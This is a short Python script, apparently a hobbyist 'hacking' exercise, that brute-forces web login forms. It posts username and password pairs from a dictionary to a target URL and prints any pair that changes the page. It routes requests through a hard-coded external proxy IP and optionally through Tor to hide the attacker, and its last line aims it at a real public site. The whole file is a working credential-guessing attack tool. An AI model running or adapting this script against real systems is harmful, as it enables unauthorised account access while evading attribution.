# Adventures on Hacking
# Basic brute force script
# by Paulo Francisco

# Imports
import requests
from bs4 import BeautifulSoup

# Default conf
session = requests.session()
session.proxies = {}
session.proxies['https'] = 'https://54.94.249.0:9080'

# Default dict
trydict = {
    "user":["admin"],
    "pass":["admin"]
}

# Set attack
def attack(url,trydict,keyName=["user","password"],torProxy=False,header=None):
    global session
    """
    'trydict' must have two arguments made of list called 'user' and 'pass'. \n
    'trydict'={"user":["admin"],"pass":["admin"]} by default.\n\n
    'keyName' reffers to target input name.\n
    'keyName'=['user','password'] by default. \n\n
    'torProxy' make requests trhough tor web.\n
    'torProxy'=False by defaul.\n
     OBS: You must have Tor installed.
    """
    # Set Headers
    if(header!=None):
        session.headers=header
    # Way through Tor Web
    if(torProxy==True):
        session.proxies['http'] = 'socks5h://localhost:9050'
        session.proxies['https'] = 'socks5h://localhost:9050'
    # Make request
    rootFile=session.get(url)
    for usuario in trydict["user"]:
        for senha in trydict["pass"]:
            file = session.post(url, data={keyName[0]:usuario,keyName[1]:senha})
            if(rootFile.text not in file.text):
                print("===============================================")
                print("=============== You're Injected ===============")
                print("User: "+usuario+"\n"+"Pass: "+senha)
                print("===============================================")
            else:
                print("Trying another one...")

attack("http://www.google.com",trydict)